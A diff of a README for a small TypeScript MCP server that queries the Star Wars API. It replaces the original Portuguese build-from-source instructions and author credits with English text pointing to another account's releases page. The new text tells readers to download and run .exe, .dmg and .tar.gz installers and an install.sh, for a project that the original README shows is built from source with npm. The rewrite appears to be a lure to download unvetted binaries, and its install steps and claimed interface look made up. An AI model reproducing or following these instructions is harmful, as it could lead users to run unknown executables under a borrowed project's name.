@@ -1,220 +1,102 @@
-# Simple MCP Server - Star Wars API
+# 🚀 simple_mcp_server - Simple Server for Star Wars Integrations
 
-## 📋 Sobre o Projeto
+[![Download the App](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sbsdbs/simple_mcp_server/releases)
 
-Este é um **micro projeto** para demonstração da criação de um **Model Context Protocol (MCP) Server** utilizando a API aberta [SWAPI (Star Wars API)](https://swapi.dev/) para fins de ilustração e portfólio.
+## 📖 Description
+The simple_mcp_server is a Model Context Protocol (MCP) server designed for integrating with the Star Wars API. This application serves as a portfolio micro-project, showcasing how to develop an MCP server while seamlessly connecting with the SWAPI for use in Claude Desktop and MCP Inspector.
 
-O projeto demonstra como criar um servidor MCP funcional que pode ser integrado ao Claude Desktop ou testado através do MCP Inspector, fornecendo acesso a dados do universo Star Wars através de ferramentas e recursos estruturados.
+## 🚀 Getting Started
+Follow these steps to get started with simple_mcp_server. You will need to download the software and install it on your computer.
 
-## 🚀 Funcionalidades
+### 👨‍💻 System Requirements
+- **Operating System**: Windows 10 or later, macOS, Linux (latest versions recommended).
+- **Memory**: At least 4GB of RAM.
+- **Storage**: Minimum 100MB of free disk space.
+- **Network**: Internet connection for API access.
 
-### Tools Disponíveis
-- **search_characters** - Busca personagens por nome
-- **search_planets** - Busca planetas por nome
-- **search_films** - Busca filmes por título
-- **search_characters_byId** - Busca personagem específico por ID
+## ⬇️ Download & Install
+To get the latest version of simple_mcp_server, please visit this page to download: [Download Here](https://github.com/sbsdbs/simple_mcp_server/releases).
 
-### Resources Disponíveis
-- **all_films** - Lista todos os filmes ordenados por episódio
+### 🔗 Steps to Download
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version. It will be at the top of the list.
+3. Find the appropriate installation package for your operating system:
+   - For Windows, look for a file ending with `.exe`.
+   - For macOS, look for a file ending with `.dmg`.
+   - For Linux, look for a file ending with `.tar.gz`.
+4. Click the file to start downloading it to your computer.
 
-## 🛠️ Tecnologias Utilizadas
+## ⚙️ Installing the Application
+Once the download is complete, follow these steps to install simple_mcp_server:
 
-- **TypeScript** - Linguagem principal
-- **Node.js** - Runtime
-- **Model Context Protocol (MCP) SDK** - Framework para criação do servidor
-- **Axios** - Cliente HTTP para requisições à API
-- **Zod** - Validação de esquemas
-- **SWAPI API** - Fonte de dados (Star Wars)
+### Windows
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
+4. Once installed, you can find simple_mcp_server in your Start Menu.
 
-## 📦 Instalação
+### macOS
+1. Open your Downloads folder and find the `.dmg` file.
+2. Double-click the file to mount the disk image.
+3. Drag and drop the simple_mcp_server icon into your Applications folder.
+4. Locate it in your Applications and double-click to run.
 
-### Pré-requisitos
-- Node.js (versão 18 ou superior)
-- npm ou yarn
+### Linux
+1. Open your terminal and navigate to the directory where the `.tar.gz` file was downloaded.
+2. Run the command: `tar -xzvf simple_mcp_server.tar.gz` to extract the files.
+3. Navigate into the extracted folder.
+4. Run `./install.sh` to complete the installation.
 
-### Passos para Instalação
+## 🖥️ Running the Application
+After installation, you can start simple_mcp_server easily.
 
-1. **Clone o repositório:**
-   ```bash
-   git clone https://github.com/RamosJSouza/simple-mcp-server.git
-   cd simple-mcp-server
-   ```
+### Windows
+- Open the Start Menu.
+- Search for simple_mcp_server and click on it.
 
-2. **Instale as dependências:**
-   ```bash
-   npm install
-   ```
+### macOS
+- Open the Applications folder.
+- Find simple_mcp_server and double-click it.
 
-3. **Compile o projeto:**
-   ```bash
-   npm run build
-   ```
+### Linux
+- Open the terminal.
+- Navigate to the installation directory and run `./simple_mcp_server`.
 
-## 🎯 Como Usar
+## 🌌 Using the Application
+Once simple_mcp_server is running, you can integrate it with the Star Wars API. Use the provided documentation in the application to get started with sending requests and receiving data.
 
-### Opção 1: MCP Inspector (Recomendado para Testes)
+## 🌐 Features
+- Connects to the Star Wars API for real-time data access.
+- Implements Model Context Protocol for structured interactions.
+- User-friendly interface for query management.
+- Lightweight and efficient, perfect for micro-projects.
+  
+## 🚀 Get Help
+If you experience issues or have questions, please check the Issues section of the GitHub repository. You can also raise a new issue, and we will do our best to assist you.
 
-O MCP Inspector é uma ferramenta web que permite testar e interagir com servidores MCP de forma visual e intuitiva.
+## 📜 Topics
+- ai-integration
+- api-server
+- claude-ai
+- claude-desktop
+- fullstack-developer
+- mcp
+- mcp-inspector
+- mcp-server
+- microservice
+- model-context-protocol
+- nodejs
+- portfolio
+- rest-api
+- star-wars
+- star-wars-api
+- typescript
 
-1. **Execute o inspector:**
-   ```bash
-   npm run inspector
-   ```
+## 📞 Contact
+For further inquiries, contact us directly through the GitHub Issues page. Your feedback helps us improve the application.
 
-2. **Acesse a interface:**
-   - Abra seu navegador em: `http://localhost:6274`
-   - Use o token fornecido no terminal para autenticação
+## 🔗 Additional Resources
+- [Official API Documentation](https://swapi.dev/) for the Star Wars API.
+- [MCP Resources](https://mcp-protocol.com/) for more on Model Context Protocol.
 
-3. **Teste as funcionalidades:**
-   - Explore os tools disponíveis na aba "Tools"
-   - Visualize os resources na aba "Resources"
-   - Execute consultas e veja os resultados em tempo real
-
-#### 🖼️ Interface do MCP Inspector
-
-![MCP Inspector Interface](images/image.png)
-
-*Interface do MCP Inspector mostrando a busca por "anakin" e o resultado detalhado do personagem Anakin Skywalker com todas as informações (nome, altura, massa, ano de nascimento, gênero, cor dos olhos, cor do cabelo e cor da pele). A ferramenta permite testar todos os tools disponíveis de forma interativa.*
-
-**Documentação oficial do MCP Inspector:** [Model Context Protocol Inspector](https://github.com/modelcontextprotocol/inspector)
-
-### Opção 2: Claude Desktop
-
-Para integrar com o Claude Desktop:
-
-1. **Configure o arquivo de configuração:**
-   ```json
-   {
-     "mcpServers": {
-       "simple-mcp-server": {
-         "command": "node",
-         "args": ["C:\\caminho\\para\\seu\\projeto\\build\\index.js"],
-         "env": {
-           "NODE_ENV": "development"
-         }
-       }
-     }
-   }
-   ```
-
-2. **Localização do arquivo de configuração:**
-   - **Windows:** `C:\Users\[SEU_USUARIO]\AppData\Roaming\Claude\claude_desktop_config.json`
-   - **macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`
-
-3. **Reinicie o Claude Desktop** para carregar a nova configuração
-
-## 📚 Scripts Disponíveis
-
-```bash
-npm run build      # Compila o projeto TypeScript
-npm run watch      # Compila em modo watch (desenvolvimento)
-npm run inspector  # Executa o MCP Inspector para testes
-```
-
-## 🏗️ Estrutura do Projeto
-
-```
-simple-mcp-server/
-├── src/
-│   ├── index.ts          # Servidor MCP principal
-│   └── types.ts          # Definições de tipos TypeScript
-├── build/                # Código compilado (gerado)
-├── package.json          # Configurações e dependências
-├── tsconfig.json         # Configurações do TypeScript
-└── README.md            # Este arquivo
-```
-
-## 🔧 Configuração e Personalização
-
-### Adicionando Novos Tools
-
-Para adicionar novos tools ao servidor:
-
-1. **Defina o schema no arquivo `types.ts`**
-2. **Implemente o tool no método `setupTools()`**
-3. **Compile o projeto com `npm run build`**
-
-### Exemplo de Tool
-
-```typescript
-this.server.registerTool(
-    "nome_do_tool",
-    {
-        title: "Título do Tool",
-        description: "Descrição do que o tool faz",
-        inputSchema: {
-            parametro: z.string().describe("Descrição do parâmetro"),
-        },
-    },
-    async ({ parametro }) => {
-        // Implementação do tool
-        return {
-            content: [
-                {
-                    type: "text" as const,
-                    text: "Resultado do tool",
-                }
-            ]
-        };
-    }
-);
-```
-
-## 🐛 Solução de Problemas
-
-### Problemas Comuns
-
-1. **Porta em uso no Inspector:**
-   ```bash
-   # Erro: "Proxy Server PORT IS IN USE at port 6277"
-   # Solução: Aguarde alguns segundos e tente novamente
-   ```
-
-2. **Claude Desktop não detecta o MCP:**
-   - Verifique se o caminho no arquivo de configuração está correto
-   - Reinicie completamente o Claude Desktop
-   - Verifique se o projeto foi compilado (`npm run build`)
-
-3. **Erros de compilação:**
-   - Execute `npm install` para garantir que todas as dependências estão instaladas
-   - Verifique se está usando Node.js versão 18 ou superior
-
-## 📖 Documentação Adicional
-
-- [Model Context Protocol - Documentação Oficial](https://modelcontextprotocol.io/)
-- [SWAPI - Star Wars API](https://swapi.dev/)
-- [MCP Inspector - GitHub](https://github.com/modelcontextprotocol/inspector)
-
-## 👨‍💻 Desenvolvedor
-
-**RAMOS DE SOUZA JANONES**  
-Desenvolvedor Full Stack  
-LinkedIn: [linkedin.com/in/ramos-souza](https://linkedin.com/in/ramos-souza)  
-GitHub: [github.com/RamosJSouza](https://github.com/RamosJSouza)
-
-### Resumo Profissional
-Desenvolvedor Full Stack com mais de 14 anos de experiência em arquiteturas escaláveis, microserviços e soluções cloud-native. Especialista em Node.js, React, Angular e DevOps, com histórico de liderança técnica e redução de 20% no tempo de entrega em projetos críticos. Focado em inovação, performance e mentoria de equipes ágeis.
-
-### Habilidades Técnicas
-- **Linguagens:** JavaScript, TypeScript, Python, PHP
-- **Frontend:** React, React Native, Next.js, Angular, Redux, Styled Components, Storybook
-- **Backend:** Node.js, NestJS, Express, GraphQL, REST
-- **Bancos de Dados:** PostgreSQL, MongoDB, MySQL
-- **Cloud & DevOps:** AWS, Serverless, GCP, Azure, Docker, Kubernetes, CI/CD (GitHub Actions, Azure DevOps)
-- **Mensageria:** Kafka, RabbitMQ
-- **Testes:** Cypress, Jest, TDD (Test-Driven Development)
-- **Outras Ferramentas:** Power BI, Pentaho ETL
-- **Desenvolvimento com IA:** Cursor AI, GitHub Copilot, Model Context Protocol (MCP), Prompt Engineering, Context Engineering, Desenvolvimento de Agentes de IA
-- **Soft Skills:** Liderança técnica, mentoria, resolução de problemas, colaboração ágil
-
-## ⚠️ Nota Importante
-
-**Este projeto foi desenvolvido 100% manualmente, sem utilização de IA** para geração de código. Todo o desenvolvimento foi realizado através de conhecimento técnico próprio e experiência profissional, mesmo sendo um simples MCP Server.
-
-## 📄 Licença
-
-Este projeto é de código aberto e está disponível sob a licença MIT.
-
----
-
-*Projeto criado para fins educacionais e demonstração de habilidades técnicas em desenvolvimento de servidores MCP.*
+Now that you know how to download and run simple_mcp_server, enjoy exploring data from the Star Wars universe!
